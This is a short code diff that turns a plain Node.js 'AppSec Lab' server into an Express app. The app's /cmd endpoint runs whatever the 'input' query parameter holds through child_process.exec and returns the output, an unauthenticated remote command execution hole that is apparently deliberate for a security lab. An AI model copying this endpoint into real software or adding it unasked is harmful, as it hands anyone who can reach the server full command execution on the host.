@@ -1,10 +1,13 @@
-const http = require('http');
+const express = require('express')
+const app = express()
 
-const server = http.createServer((req, res) => {
-  res.writeHead(200);
-  res.end('AppSec Lab Running 🚀');
-});
+app.get('/cmd', (req, res) => {
+    const exec = require('child_process').exec
+    exec(req.query.input, (err, stdout) => {
+        res.send(stdout)
+    })
+})
 
-server.listen(3030, () => {
-  console.log('Server running on port 3000');
-});
+app.listen(3030)
+
+
